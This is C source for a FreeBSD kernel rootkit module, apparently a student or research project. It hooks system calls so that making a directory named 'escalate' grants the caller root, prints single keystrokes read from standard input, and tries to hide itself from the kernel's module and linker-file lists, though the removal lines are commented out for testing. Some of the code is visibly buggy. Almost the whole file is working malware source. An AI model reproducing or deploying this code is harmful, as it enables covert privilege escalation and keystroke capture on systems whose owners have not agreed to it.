/*
 * Copyright (c) 2019 Jasper Lowell
 * Copyright (c) 2019 Wesley Hamburger
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "config.h"
#include "debug.h"

static int
load(struct module *module, int cmd, void *arg)
{
        switch(cmd) {
        case MOD_LOAD:
                LOGI("[rootkit:load] Rootkit loaded.\n");
				toggle_hook(ON, SYS_mkdir, mkdir_hook);
				toggle_hook(ON, SYS_read, read_hook);	
				remove_linker_file("rootkit.ko");
				remove_module_from_kernel("rootkit");
				break;
        case MOD_UNLOAD:
				toggle_hook(OFF, SYS_mkdir, sys_mkdir);
				toggle_hook(OFF, SYS_read, sys_read);
                LOGI("[rootkit:load] Rootkit unloaded.\n");
                break;
        default:
                LOGE("[rootkit:load] Unsupported event: {%d}.\n", cmd);
                break;
        }

        return(0);
}

static int mkdir_hook(struct thread *td, void *syscall_args){
	struct mkdir_args*uap;
	uap = (struct mkdir_args *) syscall_args;

	char path[255];
	size_t done;
	int error; 

	error = copyinstr(uap->path, path, 255, &done);

	if(error != 0 ){
		return(error);
	}

	if(strcmp(path, "escalate") == 0){
		escalate_privledge(td);
	}

	printf("HOOKING\n");
	return(sys_mkdir(td, syscall_args));
}

static int read_hook(struct thread *td, void * syscall_args){
	struct read_args * uap;
	uap = (struct read_args *)syscall_args;

	int error; 
	char buf[1];
	int done;

	error = sys_read(td, syscall_args);

	if(error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0)){
		return(error);
	}

	copyinstr(uap->buf, buf, 1, &done);

	printf("%c\n", buf[0]);

	return(error);
}

void toggle_hook(char * state, int sys_call_num, void*dest_func){
	if(strcmp(state, "on")){
		sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
		return;
	}
	sysent[sys_call_num].sy_call = (sy_call_t*)dest_func;
}


int remove_module_from_kernel(char * name){
	struct module * mod;
	int result = 1;
	sx_xlock(&modules_sx);
	
	LOGI("Searching for %s in modules\n", name);
	TAILQ_FOREACH(mod, &modules, link){
		//LOGI("Checking Module: %s\n", mod->name);
		if(strcmp(mod->name, name) == 0 ){
			LOGI("Found %s, Removing from modules list", mod->name);
			//nextid--;
			//TAILQ_REMOVE(&modules, mod, link);
			result = 0;
			break;
		}
	}

	sx_xunlock(&modules_sx);
	return result;
}

// Uncommented to make testing eaiser
int remove_linker_file(char * name){
	struct linker_file  *lf;
	int result = 1;

	mtx_lock(&Giant);
	sx_slock(&kld_sx);
	//decrement_kernel_image_ref_count();

	LOGI("Attempting to remove linker file %s\n", name);
	TAILQ_FOREACH(lf, &linker_files, link){
		LOGI("Checking %s\n", lf->filename);
		if(strcmp(lf->filename, name) == 0){
			//next_file_id--;
			//TAILQ_REMOVE(&linker_files,lf,link);
			LOGI("Found and removing linker file\n");
			result = 0;
			break;
		}
	}

	sx_unlock(&kld_sx);
	mtx_unlock(&Giant);
	return result;
}

void decrement_kernel_image_ref_count(void){
	(&linker_files)->tqh_first->refs--;
}

void escalate_privledge(struct thread * td){
	td->td_ucred->cr_uid = 0;
	td->td_ucred->cr_ruid=0;
	td->td_ucred->cr_svuid = 0;
	td->td_ucred->cr_rgid = 0;
	td->td_ucred->cr_svgid = 0;
}



static moduledata_t rootkit_mod = {
        MODULE_NAME,
        load,
        NULL
};

static moduledata_t mkdir_hook_mod = {
	"mkdir_hook",
	load,
	NULL
};

static moduledata_t read_hook_mod = {
	"read_hook",
	load,
	NULL
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
